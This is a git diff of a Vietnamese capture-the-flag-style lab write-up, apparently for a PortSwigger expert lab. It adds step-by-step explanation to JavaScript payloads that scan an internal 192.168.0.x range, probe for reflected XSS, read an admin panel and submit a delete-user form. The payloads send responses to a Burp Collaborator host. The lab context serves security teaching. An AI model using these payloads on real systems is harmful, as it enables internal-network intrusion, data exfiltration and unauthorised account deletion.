@@ -214,10 +214,15 @@ Lab này yêu cầu nhiều bước để hoàn thành. Để giải quyếtlab,
   
 Trường hợp mà bài lab này đưa ra đó chính là chúng ta phải tìm được vị trí của 1 private IP mà website này tin tưởng và dựa vào đó để tấn công và xóa đi người dùng, 
 
+Đây là 1 bài cấp độ Expert có nghĩa là 1 bài cực kỳ phức tạp và level cao. Tuy nhiên chúng ta đã biết được cách thức khai thác là gì nên bây giờ sẽ follow theo hướng dẫn và exploit nó thôi.
 
+
+##### Bước đầu tiên: quét mạng nội bộ
+
+Đầu tiên việc chúng ta cần làm là quét mạng nội bộ để tìm ra được địa chỉ IP, để tìm được thì chúng ta cần sự hỗ trợ của Burp Suite Collaborator Client để poll những response leak được về, đoạn payload dưới đây sẽ quét từ http://192.168.0.1 - http://192.168.0.255 và tìm xem địa chỉ nào phù hợp 
 ```
 <script>
-var q = [], collaboratorURL = 'http://mmcdur1ianel3qw2y4in7zasbjha5z.burpcollaborator.net';
+var q = [], collaboratorURL = 'http://bbq6iwl2yh0xqnyyqkm0r8w9g0mqaf.burpcollaborator.net';
 for(i=1;i<=255;i++){
   q.push(
   function(url){
@@ -251,9 +256,13 @@ function fetchUrl(url, wait){
 </script>
 
 ```
+Như chúng ta có thể thấy, chúng ta đã định vị máy chủ nội bộ (trong trường hợp này) là: *192.168.0.212:8080*
 
+##### Bước thứ hai: tìm lỗ hổng trong máy chủ nội bộ
 
+Ở bước này chúng ta thực hiện tương tự bước đầu tiên nhưng khác biệt ở phần payload như sau : 
 
+Đoạn code này đang cố gửi username và password đi, nếu như username và password được trả về trong response thì chứng tỏ rằng có thể dẫn đến lỗi XSS.
 ```
 <script>
 function xss(url, text, vector) {
@@ -268,11 +277,17 @@ function fetchUrl(url, collaboratorURL){
   ))
 }
 
-fetchUrl("http://192.168.0.219:8080", "http://mmcdur1ianel3qw2y4in7zasbjha5z.burpcollaborator.net");
+fetchUrl("http://192.168.0.212:8080", "http://bbq6iwl2yh0xqnyyqkm0r8w9g0mqaf.burpcollaborator.net");
 </script>
 
 ```
+Như chúng tôi mong đợi tên người dùng được phản ánh trong phản hồi (trong hình).
 
+Điều này có nghĩa là chúng ta có thể chuyển hướng nạn nhân đến trang đăng nhập nội bộ và thực thi các tập lệnh từ đó, có thể bypass qua CORS.
+
+##### Bước thứ ba : Truy xuất Admin Panel
+
+Đoạn code này sẽ cho phép chúng ta truy xuất vào thử panel của admin
 ```
 <script>
 function xss(url, text, vector) {
@@ -285,12 +300,15 @@ function fetchUrl(url, collaboratorURL){
   }
   ))
 }
-
-fetchUrl("http://192.168.0.219:8080", "http://mmcdur1ianel3qw2y4in7zasbjha5z.burpcollaborator.net");
+fetchUrl("http://192.168.0.212:8080", "http://bbq6iwl2yh0xqnyyqkm0r8w9g0mqaf.burpcollaborator.net");
 </script>
 
 ```
 
+
+##### Bước cuối 
+
+Dựa vào biểu mẫu trả về ở bước 3 chúng ta thấy chức năng delete của admin, vây nên chúng ta viết payload như sau để thực thi biểu mẫu delete và xóa username = carlos
 ```
 <script>
 function xss(url, text, vector) {
@@ -305,7 +323,7 @@ function fetchUrl(url){
   ))
 }
 
-fetchUrl("http://192.168.0.219:8080");
+fetchUrl("http://192.168.0.212:8080");
 </script>
 
 ```
